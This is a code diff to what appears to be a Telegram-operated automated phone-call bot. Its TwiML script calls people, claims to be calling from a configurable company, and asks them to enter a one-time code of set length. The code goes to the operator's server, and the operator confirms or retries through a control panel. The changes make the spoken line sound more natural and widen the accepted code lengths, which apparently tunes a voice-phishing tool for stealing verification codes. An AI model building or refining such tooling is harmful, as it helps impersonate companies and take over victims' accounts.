@@ -104,7 +104,7 @@ function panelButtons(){
 return[
 [
 {text:"✔ Confirm",callback_data:"confirm"},
-{text:"🔁 Retry",callback_data:"retry"}
+{text:"🔁 Ask Again",callback_data:"retry"}
 ],
 [
 {text:"⛔ Hang Up",callback_data:"hangup"}
@@ -113,7 +113,7 @@ return[
 {text:"📞 Call Last",callback_data:"calllast"}
 ],
 [
-{text:"📊 Status",callback_data:"status"},
+{text:"📊 Stats",callback_data:"status"},
 {text:"📜 Logs",callback_data:"logs"}
 ]
 ]
@@ -159,7 +159,7 @@ res.type("text/xml")
 res.send(`
 <Response>
 <Say voice="${assistants[settings.assistant].voice}">
-Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
+Hello im calling from ${settings.company}. Please enter your ${settings.digits} digit code.
 </Say>
 <Gather numDigits="${settings.digits}" action="${BASE_URL}/code"/>
 </Response>
@@ -340,7 +340,7 @@ if(text.startsWith("/digits")){
 
 const d=parseInt(text.split(" ")[1])
 
-if(d>=2 && d<=10){
+if(d>=1 && d<=12){
 settings.digits=d
 updatePanel()
 }
